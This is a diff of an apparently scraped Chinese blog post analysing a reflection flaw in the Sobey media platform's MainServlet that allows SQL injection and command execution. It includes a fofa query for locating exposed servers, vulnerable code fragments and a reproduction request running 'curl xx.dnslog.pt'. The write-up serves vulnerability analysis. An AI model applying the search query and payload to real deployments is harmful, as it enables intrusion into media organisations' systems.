@@ -4,23 +4,6 @@ source: https://mrxn.net/jswz/sobey-MainServlet-sqli-rce.html
 asset_dir: embedded-base64
 ---
 
-# 索贝融媒体 MainServlet 反射调用致SQL注入与命令执行漏洞
-
-[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/20 10:19
-- 1176浏览
-- [3评论](#comment)
-- 2小时阅读
-
-深入探索
-
-应用
-
-SQL
-
-App
-
----
-
 # 漏洞简介
 
 索贝融媒体是一款专业的媒体[内容管理](#)与发布平台，广泛应用于新闻机构的内容生产、编辑、存储和多渠道分发等业务场景。该平台的MainServlet组件存在反射调用缺陷，获得授权的攻击者可通过精心构造的请求参数触发不安全的反射调用机制，绕过输入验证和安全防护，直接执行任意SQL查询和[系统命令](https://mrxn.net/tag/rce)。此漏洞可能导致攻击者未授权访问敏感数据库信息、篡改或删除关键内容，甚至在服务器上执行任意代码，完全控制系统资源，造成严重的信息泄露、业务中断和系统安全风险。
@@ -32,8 +15,18 @@ SQL注入防护
 # fofa语法
 
 > app="SOBEY-融媒体"
+>
+> 代码安全审计
 
 # 漏洞分析
+
+深入探索
+
+网络安全会议
+
+网络安全课程
+
+安全研究工具
 
 先看 web.xml 里对 `MainServlet` 的定义
 
@@ -51,15 +44,7 @@ SQL注入防护
 
 外部通过URL路径 `MainServlet.jsp` 对`MainServlet`的访问，再看`MainServlet`的内部实现逻辑
 
-代码安全审计
-
-深入探索
-
-传输层安全性协议
-
-漏洞修复方案
-
-网络安全课程
+漏洞预警服务
 
 ```
 package com.sobey.cms.framework;
@@ -153,7 +138,7 @@ public class MainServlet extends HttpServlet {
 
 其中关键点在下面的**Class.forName**反射调用部分
 
-漏洞预警服务
+内容管理
 
 ```
 String className = method.substring(0, method.lastIndexOf("."));
@@ -185,7 +170,7 @@ App.LoginClass来自框架的定义
 
 同时也会对当前会话的权限进行校验
 
-内容管理
+软件
 
 ```
 if (!className.equals(LoginClass) && !SessionCheck.check(c, user)) {
@@ -202,7 +187,7 @@ OK，自此流程分析完毕
 
 下面来看上面已经提到过的危险类`CommandExecutorUtil`，其中包含直接[执行命令](https://mrxn.net/tag/rce)的方法**exec**
 
-软件
+网络安全
 
 ```
 package com.sobey.cms.framework.utility;
@@ -250,7 +235,7 @@ public class CommandExecutorUtil {
 
 直接获取`command`参数调用`Runtime.getRuntime().exec` [执行命令](https://mrxn.net/tag/rce)，命令执行结果直接记录在日志文件里。
 
-网络安全
+文件大小转换
 
 根据上面的命令执行类可以写一个jsp来测试
 
@@ -272,7 +257,7 @@ public class CommandExecutorUtil {
 
 > 该命令执行没有回显，只有成功true或者失败false
 >
-> 安全工具开发
+> 计算机安全
 
 ## SQL注入
 
@@ -383,32 +368,3 @@ Cookie: JSESSIONID=xxxxx
 
 command=curl xx.dnslog.pt
 ```
-
-- 标签：
-- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
-- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
-- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
-- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
-- [#Java](https://mrxn.net/tag/Java)
-- [#rce](https://mrxn.net/tag/rce)
-
----
-
-文章目录
-
-- [1.漏洞简介](#toc-1-)
-- [2.影响版本](#toc-2-)
-- [3.fofa语法](#toc-3-)
-- [4.漏洞分析](#toc-4-)
-- [4.1.命令执行-RCE](#toc-4-1-)
-- [4.2.SQL注入](#toc-4-2-)
-- [5.漏洞复现](#toc-5-)
-- [5.1.SQL注入](#toc-5-1-)
-- [5.2.命令执行](#toc-5-2-)
-
-  
-  
-
-![](data:image/png;base64,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)
-
-手机扫码阅读
